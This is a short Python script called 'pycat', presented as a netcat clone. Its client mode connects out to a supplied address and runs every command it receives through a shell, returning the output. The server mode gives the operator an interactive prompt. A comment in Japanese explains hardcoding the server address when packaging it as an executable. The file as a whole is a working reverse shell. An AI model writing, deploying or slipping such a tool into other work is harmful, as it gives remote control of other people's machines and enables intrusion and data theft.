import sys
import socket
import subprocess
import argparse

parser = argparse.ArgumentParser(
    prog = 'pycat',
    usage = '\n' + '(Server Listen)python3 pycat.py -lp <port number>' + '\n' +
                   '(Client Connect)python3 pycat.py -c -t <ip address> -p <port number>',
    description = 'Implement netcat in python',
    epilog = 'end',
    add_help = True,
)

parser.add_argument('-l', '--listen', help='Set up server', action='store_true')
parser.add_argument('-c', '--connect', help='Initialize a command shell', action='store_true')
parser.add_argument('-t', '--target', help='Specify the IP address of the device to connect', default=None)
parser.add_argument('-p', '--port', help='Specify the Port number of the device to connect', default=None, type=int)
args = parser.parse_args()

def client_func():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #exeなどに変換する場合,サーバのipアドレスとポート番号をコードに含める必要がある
    #ip = '127.0.0.1
    #port = <port number>
    try:
        client.connect((args.target, args.port))
        #client.connect((ip, port))

        while True:
            command = client.recv(1024)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            client.send(output + output_error)

    except:
        print('[*] Server cannot be reached.')
        client.close()



def server_func():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', args.port))
    print('[+] Server Started')
    server.listen(5)
    client_socket, client_addr = server.accept()
    print(f'[+] {client_addr} client opened the port')

    while True:
        command = input('client@shell:')
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        
        output = client_socket.recv(1024).decode()
        print(output)

    client_socket.close()

    server.close()
        

def main():
    if args.connect:
        client_func()
        
    elif args.listen:
        server_func()

    else:
        parser.print_help()
        sys.exit(1)

if __name__ == '__main__':
    main()
